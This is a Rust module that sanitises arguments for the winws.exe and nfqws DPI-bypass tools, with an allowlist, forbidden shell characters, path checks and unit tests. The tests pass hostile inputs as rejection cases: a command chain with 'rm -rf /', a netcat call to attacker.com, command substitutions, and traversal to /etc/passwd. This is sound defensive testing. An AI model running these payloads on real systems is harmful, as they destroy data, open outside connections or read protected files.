/* 
   Argument sanitization layer for winws.exe invocation.
   This module implements the Rust-side (backend) defense-in-depth validation
   for preset arguments. It is the *authoritative* security gate — the
   frontend `presetValidator.ts` is a UX convenience only.
   Architecture: Called inside `EngineManager::start()` before spawn,
   ensuring no IPC path (import, remote presets, direct invoke) can
   bypass validation. 
*/

use crate::engine::error::EngineError;

// Maximum number of arguments a preset may carry.
const MAX_ARG_COUNT: usize = 30;

// Maximum character length of a single argument string.
const MAX_ARG_LEN: usize = 128;

/* 
   Allowlist of argument prefixes accepted by winws.exe & nfqws.
   Any argument not matching at least one prefix is rejected. 
*/
const ALLOWED_PREFIXES: &[&str] = &[
    // Network filter flags
    "--filter-tcp=",
    "--filter-udp=",
    "--wf-tcp=",
    "--wf-udp=",

    // Windows WinDivert capture flags (CRITICAL: without this all Windows presets fail)
    "--windivert=",
    "--windivert",

    // WinDivert filter expression tokens (e.g. "tcp.DstPort==443", "udp.DstPort==443")
    "tcp.",
    "udp.",
    "icmp.",

    // Linux nfqueue capture flag
    "--qnum=",

    // Whitelist / Hostlist flags
    "--wl=",
    "--hostlist=",

    // DPI desynchronisation flags
    "--dpi-desync=",
    "--dpi-desync-split-pos=",
    "--dpi-desync-repeats=",
    "--dpi-desync-fooling=",
    "--dpi-desync-ttl=",
    "--dpi-desync-cutoff=",
    "--dpi-desync-any-protocol",
    "--dpi-desync-autottl",

    // Packet parameters
    "--mss=",
    "--new-ttl=",
    "--max-payload=",

    // Verbosity (read-only, no side effects)
    "--debug",
    "--debug2",
];

// Characters that are forbidden in *any* argument value.
/* 
   These are Unix/Windows shell metacharacters that could be used
   to inject additional commands if the argument is ever passed through
   a shell interpreter. Even though we use `Command::new()` with an
   args array (not shell), defense-in-depth demands their exclusion. 
*/
const FORBIDDEN_CHARS: &[char] = &[
    '&', ';', '|', '`', '$', '<', '>', '\'', '"', '\\', '/', '\n', '\r', '\0',
];

// Validates a preset's argument list against the security policy.
/* 
   Errors: Returns `EngineError::InvalidPreset` with a descriptive message on
   the first violation found. Does NOT return all violations at once —
   fail-fast on first bad arg keeps the logic simple. 
*/
pub fn validate_preset_args(args: &[String]) -> Result<(), EngineError> {
    if args.len() > MAX_ARG_COUNT {
        return Err(EngineError::InvalidPreset(format!(
            "Argüman sayısı limiti aşıldı: {} > {} (izin verilen maksimum).",
            args.len(), MAX_ARG_COUNT
        )));
    }

    for arg in args {
        validate_single_arg(arg)?;
    }

    Ok(())
}

fn validate_single_arg(arg: &str) -> Result<(), EngineError> {
    // ─── Length guard ──────────────────────────────────────────────────────
    if arg.len() > MAX_ARG_LEN {
        return Err(EngineError::InvalidPreset(format!(
            "Argüman çok uzun ({} karakter > {} limit): \"{}…\"",
            arg.len(), MAX_ARG_LEN,
            &arg[..MAX_ARG_LEN.min(32)]
        )));
    }

    // ─── Empty arg guard ───────────────────────────────────────────────────
    if arg.is_empty() {
        return Err(EngineError::InvalidPreset(
            "Boş argüman kabul edilmiyor.".into()
        ));
    }

    /* 
       Forbidden character check: This runs before the allowlist so injection attempts 
       produce a clear error rather than an opaque "unknown argument" message. 
    */
    for &ch in FORBIDDEN_CHARS {
        if arg.contains(ch) {
            return Err(EngineError::InvalidPreset(format!(
                "Güvenli olmayan karakter '{:?}' argümanda tespit edildi: \"{}\"",
                ch, sanitize_for_log(arg)
            )));
        }
    }

    // ─── Allowlist check ───────────────────────────────────────────────────
    let is_allowed = ALLOWED_PREFIXES.iter().any(|prefix| {
        // Exact match for flags without values (e.g. "--dpi-desync-autottl")
        // or prefix match for flags with values (e.g. "--mss=1300")
        arg == *prefix || arg.starts_with(prefix)
    });

    if !is_allowed {
        return Err(EngineError::InvalidPreset(format!(
            "Tanınmayan argüman reddedildi: \"{}\". \
             Yalnızca bilinen winws/nfqws parametreleri kabul edilir.",
            sanitize_for_log(arg)
        )));
    }

    // Specific sub-validations
    if arg.starts_with("--hostlist=") {
        let val = &arg["--hostlist=".len()..];
        validate_hostlist_value(val)?;
    } else if arg.starts_with("--wl=") {
        let val = &arg["--wl=".len()..];
        if validate_ip_or_domain(val).is_err() {
            validate_hostlist_value(val)?;
        }
    }

    Ok(())
}

fn validate_hostlist_value(val: &str) -> Result<(), EngineError> {
    if val.is_empty() {
        return Err(EngineError::InvalidPreset("Hostlist değeri boş olamaz".into()));
    }
    if val.contains("..") {
        return Err(EngineError::InvalidPreset("Dizin geçişi (..) tespit edildi".into()));
    }
    if val.contains("//") {
        return Err(EngineError::InvalidPreset("Çift taksim (//) tespit edildi".into()));
    }
    if val.contains('\\') {
        return Err(EngineError::InvalidPreset("Ters taksim (\\) tespit edildi".into()));
    }
    if val.contains('\0') {
        return Err(EngineError::InvalidPreset("Null karakter tespit edildi".into()));
    }
    if val.contains('%') {
        return Err(EngineError::InvalidPreset("Yüzde işareti (%) veya URL encoding tespit edildi".into()));
    }
    if val.starts_with('/') {
        return Err(EngineError::InvalidPreset("Mutlak yol (Linux) kabul edilmiyor".into()));
    }
    let chars: Vec<char> = val.chars().collect();
    if chars.len() >= 2 {
        if chars[1] == ':' && chars[0].is_ascii_alphabetic() {
            return Err(EngineError::InvalidPreset("Sürücü harfi içeren mutlak yol kabul edilmiyor".into()));
        }
    }
    Ok(())
}

fn validate_ip_or_domain(val: &str) -> Result<(), EngineError> {
    if val.is_empty() {
        return Err(EngineError::InvalidPreset("IP veya domain değeri boş olamaz".into()));
    }
    for c in val.chars() {
        if !c.is_ascii_alphanumeric() && c != '.' && c != '_' && c != '-' {
            return Err(EngineError::InvalidPreset(format!("Geçersiz karakter '{}' IP/domain içinde tespit edildi", c)));
        }
    }
    if val.contains("..") {
        return Err(EngineError::InvalidPreset("Çift nokta (..) tespit edildi".into()));
    }
    Ok(())
}

/* 
   Sanitizes a potentially malicious string for safe inclusion in log messages.
   Truncates and replaces non-printable characters. 
*/
fn sanitize_for_log(s: &str) -> String {
    s.chars()
        .take(48)
        .map(|c| if c.is_control() { '?' } else { c })
        .collect()
}

// ─── Unit Tests ────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_valid_args_pass() {
        let args = vec![
            "--wf-tcp=80,443".to_string(),
            "--dpi-desync=fake".to_string(),
            "--dpi-desync-autottl".to_string(),
            "--mss=1300".to_string(),
            "--filter-tcp=80".to_string(),
            "--windivert".to_string(),
            "tcp.DstPort==443".to_string(),
            "--qnum=200".to_string(),
        ];
        assert!(validate_preset_args(&args).is_ok());
    }

    #[test]
    fn test_shell_injection_rejected() {
        let payloads = vec![
            "--dpi-desync=fake && cmd.exe /c malware.exe",
            "--mss=1300; rm -rf /",
            "--wf-tcp=80|nc attacker.com 4444",
            "--dpi-desync=`whoami`",
            "--mss=$(evil)",
        ];
        for payload in payloads {
            let args = vec![payload.to_string()];
            assert!(
                validate_preset_args(&args).is_err(),
                "Injection geçmemeli: {}",
                payload
            );
        }
    }

    #[test]
    fn test_unknown_arg_rejected() {
        let args = vec!["--unknown-flag=value".to_string()];
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn test_empty_arg_rejected() {
        let args = vec!["".to_string()];
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn test_too_many_args_rejected() {
        let args: Vec<String> = (0..=MAX_ARG_COUNT)
            .map(|_| "--dpi-desync-autottl".to_string())
            .collect();
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn test_arg_too_long_rejected() {
        let long_arg = format!("--dpi-desync={}", "x".repeat(MAX_ARG_LEN));
        let args = vec![long_arg];
        assert!(validate_preset_args(&args).is_err());
    }

    #[test]
    fn test_path_traversal_rejected() {
        // Ensure directory traversal can't sneak through (even with allowed prefixes)
        let payloads = vec![
            "../../../etc/passwd",
            "--hostlist=../../../etc/passwd",
            "--hostlist=C:/Windows/win.ini",
            "--hostlist=..\\..\\Windows\\win.ini",
        ];
        for payload in payloads {
            let args = vec![payload.to_string()];
            assert!(
                validate_preset_args(&args).is_err(),
                "Path traversal did not fail: {}",
                payload
            );
        }
    }

    #[test]
    fn test_windivert_args_pass() {
        // Validates that Windows WinDivert capture flags are accepted.
        // These were the critical missing prefixes that caused the "Logic Bomb".
        let args = vec![
            "--windivert".to_string(),
            "--windivert=filter".to_string(),
            "tcp.DstPort==443".to_string(),
            "udp.DstPort==443".to_string(),
            "icmp.Type==8".to_string(),
        ];
        assert!(validate_preset_args(&args).is_ok());
    }

    #[test]
    fn test_linux_qnum_arg_passes() {
        // Validates that the Linux NFQUEUE argument injected by prepare_args is accepted.
        let args = vec!["--qnum=200".to_string()];
        assert!(validate_preset_args(&args).is_ok());
    }

    #[test]
    fn test_hostlist_args_pass() {
        let args = vec![
            "--hostlist=list.txt".to_string(),
            "--wl=example.com".to_string(),
        ];
        assert!(validate_preset_args(&args).is_ok());
    }

    // --- Proptest Fuzzing ---
    use proptest::prelude::*;

    proptest! {
        #[test]
        fn path_traversal_always_rejected(s in ".*") {
            let arg = format!("--hostlist={}", s);
            let has_traversal = s.contains("..")
                || s.contains("//")
                || s.contains('\\')
                || s.contains('\0')
                || s.contains('%')
                || s.starts_with('/')
                || (s.len() >= 2 && s.chars().nth(0).unwrap().is_ascii_alphabetic() && s.chars().nth(1).unwrap() == ':');

            let result = validate_single_arg(&arg);
            if has_traversal {
                assert!(result.is_err(), "Expected error for: {}", s);
            }
        }

        #[test]
        fn valid_ip_or_domain_always_accepted(s in "[a-zA-Z0-9_-]{1,20}(\\.[a-zA-Z0-9_-]{1,20})*") {
            let arg = format!("--wl={}", s);
            let result = validate_single_arg(&arg);
            if !s.contains("..") && s.len() + 5 <= MAX_ARG_LEN {
                assert!(result.is_ok(), "Expected ok for: {}, got {:?}", s, result);
            }
        }
    }
}
